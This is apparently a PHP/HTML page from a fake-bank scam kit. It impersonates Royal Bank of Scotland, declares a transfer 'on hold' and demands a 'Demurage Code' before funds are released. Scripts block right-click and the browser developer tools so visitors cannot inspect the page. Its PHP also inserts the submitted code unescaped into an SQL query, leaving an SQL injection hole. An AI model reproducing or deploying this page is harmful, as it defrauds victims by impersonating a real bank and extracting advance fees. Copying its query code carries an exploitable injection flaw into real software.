<?php
session_start();
include 'connection.php';
if(isset($_SESSION['email']))
{
$email = $_SESSION['email'];	

if(isset($_POST['transfer_submit']))
{
	
	$imf_code= $_POST['imf_code'];
	$sql = "select * from frean WHERE imf_code = '$imf_code' AND email = '$email'";
	$row = $conn->query($sql);
	if($row->num_rows>0)
		header('Location:imfcode-login.php');
	else
		$error_msg = "Invalid IMF Code";
}
}
else
	exit;

?>
<html>
    <title>Royal Bank Of Scotland-IMF Code</title>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
 <link rel="icon" type="png" href="image/logoshsbc.png" style="width:5%">
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.1/css/all.css" integrity="sha384-gfdkjb5BdAXd+lj+gudLWI+BXq4IuLW5IT+brZEZsLFm++aCMlF1V92rMkPaX4PP" crossorigin="anonymous">
<link rel="stylesheet" href="css/bootstrap.css">
<link rel="stylesheet" href="css/bootstrap.min.css">
<link rel="stylesheet" href="css/style.css">
</head>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.5/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>

<style>
.no-js #loader { display: none;  }
.js #loader { display: block; position: absolute; left: 100px; top: 0; }
.se-pre-con {
	position: fixed;
	left: 0px;
	top: 0px;
	width: 100%;
	height: 100%;
	z-index: 9999;
	background: url(image/loading-gif-animation.gif) center no-repeat #fff;
}
}
.timeline-wrapper {
  margin-left: 1.rem;
  border-left: 4px solid #ddd;
}
.node {
  padding-left: 1.2rem;
  padding-bottom: 1.8rem;
  position: relative;
 
}
.node h3, .node p {
  margin: 0;
}
.node::before {
  content: "";
  width: .8rem;
  height: .8rem;
  background: green;
  border: 1px solid #ccc;
  border-radius: 50%;
  position: absolute;
  top: .3rem;
  left: -.5rem;
}

.table{width:80%;margin:auto;background:#4040bf;border:2px solid green;}
th{text-align:center;color:#fff;}
.br{border:0.7px solid black;
width:100%;
display:block;
color:#fff;
padding:3px;
}


.bor{border:2px solid black;}
.header{width:100%;height:80px;background:lightgray;}
	  *{margin:0;box-sizing:border-box;}
	  body {font-family: "Lato", sans-serif;}
	  .table{width:80%;margin:auto;background:orange;border:2px solid green;}
th{text-align:center;color:#fff;}
.br{border:0.7px solid black;
width:100%;
display:block;
color:#fff;
padding:3px;
}

.bor{border:1px solid black;}


.blinking{
    animation:blinkingText 1.2s infinite;
     color:#ff3300;
}
@keyframes blinkingText{
    0%{     color: #000;    }
    49%{    color: #000; }
    60%{    color: transparent; }
    99%{    color:transparent;  }
    100%{   color: #000;    }
 
}
</style>

 
  <script>
	$(window).load(function() {
		// Animate loader off screen
		$(".se-pre-con").fadeOut("slow");
	});
</script>
<div class="se-pre-con no-js">
</div>

<body>
<div style="background-color:orange">
    <div class="container">
        <div class="row">
            <div class="col-md-4">
            <img src="./image/royalbank-logs.png" width="170" height="50" style="float:left;">
            </div>
            <div class="col-md-8">
              <span style="font-size:25px;color:#000000;"> Welcome To Royal Bank Of Scotland Online Technology</span>
            </div>
            </div>
        </div>
    </div>
    <div class="container">
<div class="row">
	<div class="col-md-3.5 border 2px solid black">
        <img src="image/morethanbanking.png" style="width:300px;height:120px;padding-top:0;margin:0;">
         </div>

<div class="col-md-3.5 border 2px solid black">
<img src="image/_103079097_mediaitem103077956.jpg" style="width:400px;height:120px;padding-top:0;margin:0;">
</div>
<div class="col-md-3.5 border 2px solid black">
<img src="image/rbs3g.png" style="width:400px;height:120px;padding-top:0;margin:0;">

</div>
</div>
</div><br>
<div class="container">
    <div class="row">
	    <div class="col-md-3">
		<span style="font-size:15px; font-family:Trebuchet MS;">  <p id="rest" style="text-align:right"</p></span>
									    <script>
                                    var asiaTime = new Date().toLocaleString("en-US", {timeZone: "Asia/calcutta"});
                                     asiaTime = new Date(asiaTime);
                                     console.log('Europe time: '+asiaTime.toLocaleString())
                                     document.getElementById('rest').innerHTML=asiaTime.toLocaleString();
                                     </script>
		</div>
		<div class="col-md-3">
		</div>
		<div class="col-md-3">
		<p style="color:#000000;float:right;">Your IP address is: <? echo $_SERVER["REMOTE_ADDR"]; ?></p>
		</div>
    </div>
</div>
</div>
<div style="height:60px"></div>
<div class="container">
    <div class="row">
    <div class="col-md-12 justify-content-right">
        <div id="Sign In"align="center">
<div style="width:600px;border:3px solid #ebebe0; background-color:white;margin:auto;padding:5px;"><br><br>
<span class="blinking" ><span style="font-size;15px;font-family:tahoma;"><b>TRANSFER ON HOLD!!<br> CONTACT YOUR TRANSFER OFFICER</br></b></span></span><br><br>
<h6 class="glow"><span style="font-family:kalinga;font-size:20px;"> <b>DEMURAGE CODE IS REQUIRED:</b></span></h6><br>

<span style="font-family: kalinga; font-size:20px">You are required to request for Demurage Code  </span><br>
<form action="" method="POST">
<?=@$error_msg?>
<p style="color:#66a3ff"><span style="font-family:kalinga;font-size:20px;"><b>Demurage Code  :</b></span></p>
<span style="font-family:kalinga;font-size:18px;"> Demurage Code : </span><input type="text" name="imf_code" id="pass" /><br><br>
<input name="transfer_submit" value="Transfer Now" onclick='javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions("ctl00$ContentPlaceHolder1$SUBMIT", "", true, "chk", "", false, false))' id="ctl00_ContentPlaceHolder1=SUBMIT" class="btn btn-block bg-default btn-flat " style="width:150px; color:#fff;  margin-bottom:30px; background:#D4090C; " type="Submit">
</form>
</div>
</div>
</div>
</div>
</div>

		

	<div id="Sign In"align="center">
	    <div style="height:30px;"></div>
<div style="background-color:#ffffff;width:700px;height:150px;"><img src="image/StopWastingMoney_Pic2_850x400_Anime.gif" width="200" height:"100"></div>
	
	<div style="height:30px;"></div>
	<div id="Sign In"align="center">
<div style="background-color:#ffc266;width:700px;height:3px;"></div>
    <span style="font-family:calibri;font-size:15px;color:#000000;padding-bottom:60px;float:center;">  This is under the Royal Bank Of Scotland.|  &#169 All Rights Reserved 2019. | For enquiries: </span>

</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<script>
document.addEventListener('contextmenu', event => event.preventDefault());

$(document).keydown(function (event) {
    if (event.keyCode == 123) { // Prevent F12
        return false;
    } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
        return false;
    }
});

</script>
</html>